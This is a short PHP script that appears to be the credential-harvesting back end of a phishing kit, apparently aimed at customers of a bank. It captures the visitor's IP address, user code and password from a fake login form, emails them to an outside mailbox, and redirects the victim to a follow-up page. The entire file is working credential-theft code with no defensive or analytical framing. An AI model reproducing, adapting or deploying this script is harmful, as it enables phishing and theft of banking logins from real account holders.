<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['codeUtilisateur'];
$pass = $_POST['password'];
$data ="
--------------------------------------------
          IP       : $ip
--------------------------------------------
Number   : $user

Password : $pass
-------------xXx3_8xXx------------------

";

$subj="DESJ $ip"; 

$emailusr = 'bzfrap514@protonmail.com';

mail($emailusr, $subj, $data);	

		   header("Location: ondetverifier.php");

?>

 
